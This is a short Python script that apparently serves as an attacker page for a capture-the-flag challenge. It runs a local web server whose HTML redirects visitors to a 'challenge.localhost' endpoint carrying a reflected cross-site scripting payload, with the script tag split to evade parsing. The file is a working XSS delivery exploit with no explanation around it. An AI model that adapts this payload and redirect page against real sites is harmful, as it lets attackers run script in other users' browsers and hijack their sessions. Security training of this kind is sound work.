from http.server import HTTPServer, BaseHTTPRequestHandler

class HackerServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        html_payload = """
        <!DOCTYPE html>
            <html>
            <body>
                <script>
                    var alert="<script>alert('PWNED')</s"+"cript>";
                    window.location.href="http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(alert);
                </script>
            </body>
            </html>
            """
        self.wfile.write(html_payload.encode('utf-8'))

if __name__ == "__main__":
    server_address = ('127.0.0.1', 1337)
    httpd = HTTPServer(server_address, HackerServer)
    httpd.serve_forever()